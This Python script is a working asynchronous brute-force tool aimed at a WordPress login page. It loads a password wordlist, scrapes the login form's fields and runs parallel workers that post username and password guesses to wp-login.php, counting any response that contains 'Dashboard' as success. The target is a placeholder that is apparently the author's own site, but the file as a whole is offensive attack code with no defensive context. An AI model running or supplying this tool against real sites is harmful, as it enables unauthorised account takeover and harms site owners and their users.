import asyncio
from io import BytesIO

from lxml import etree
import httpx
import sys


class Bruter:
    client = httpx.AsyncClient(follow_redirects=True, timeout=60)
    success_keyword = "Dashboard"

    def __init__(self, username, target_url, nr_workers=5):
        self.username = username
        self.target_url = target_url
        self.passwords_queue = asyncio.Queue()
        self.content = dict()
        self.nr_workers = nr_workers
        self.success_password = None

    def load_passwords(self, path: str):
        print(f'[1] -- Loading passwords from {path}..')
        with open(path, 'r') as f:
            raw_words = f.read()
            for word in raw_words.split():
                self.passwords_queue.put_nowait(item=word)

    async def get_content(self):
        print(f"[2] -- Retrieving form fields from {self.target_url}..")
        res = await self.client.get(self.target_url)
        parser = etree.HTMLParser()
        tree = etree.parse(BytesIO(res.content), parser=parser)
        for elem in tree.findall("//input"):
            name = elem.get("name")
            self.content[name] = elem.get('value', None)

    async def worker(self):
        while not self.passwords_queue.empty():
            password = await self.passwords_queue.get()
            await asyncio.sleep(1)
            data = self.content.copy()
            data.update({"log": self.username, "pwd": password})
            res = await self.client.post(self.target_url, data=data)
            self.passwords_queue.task_done()
            if self.success_keyword in res.content.decode():
                sys.stdout.write("OK")
                self.success_password = password
            else:
                sys.stdout.write('.')

    async def run(self, passwords_path):
        self.load_passwords(passwords_path)
        await self.get_content()
        print(f"[3] -- Starting attack --")
        async with asyncio.TaskGroup() as tg:
            for _ in range(self.nr_workers):
                tg.create_task(self.worker())

        await self.passwords_queue.join()

    async def __aenter__(self):
        await self.client.__aenter__()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        await self.client.aclose()


async def main():
    username = "my-word-press@email.com"
    target = "https://my-wordpress-site/wp-login.php"
    wordlist = "cain.txt"

    async with Bruter(username, target) as bruter:
        await bruter.run(wordlist)

    if found := bruter.success_password:
        print(f'\nPassword is: {found}')
    else:
        print(f'\nNo passwords match')

if __name__ == '__main__':
    asyncio.run(main())
